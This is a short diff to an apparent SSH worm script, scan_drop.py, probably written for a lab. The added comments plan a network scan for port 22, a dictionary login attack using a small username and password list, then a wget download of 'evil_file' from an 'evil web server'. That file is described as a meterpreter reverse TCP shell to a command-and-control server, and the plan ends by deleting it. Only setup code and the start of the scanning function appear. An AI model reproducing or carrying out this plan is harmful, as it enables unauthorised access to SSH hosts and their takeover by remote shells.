@@ -3,14 +3,29 @@ import multiprocessing
 import time
 import warnings
 
+# scan_drop.py functions
+# 1. Scans target network for nodes running ssh services on port 22.
+# 2. If successful, then RCE. Run 'wget' to get file from our evil web server. 
+# 3. Run "evil_file".
+# 4. Finally, delete "evil_file"i & disconnect.
+
+# evil_file functions
+# 1. "evil_file" is a meterpreter reverse tcp shell to C&C.
+# 2. C&C takes over.
+# 3. 
+
+#"malicious" file from our evil web server to the target.
+
 # remove depracated warnings
 warnings.filterwarnings(action='ignore',module='.*paramiko.*')
 
+# small dictionary list
 user_list = ['fresh1','fresh2','fresh3','fresh4']
 pass_list = ['fresh4','fresh3','fresh2','fresh1']
 jobs = []
 num = 0
 num2 = 0
+
 
 def ssh_start():
     ip = "192.168.203.%d" % i
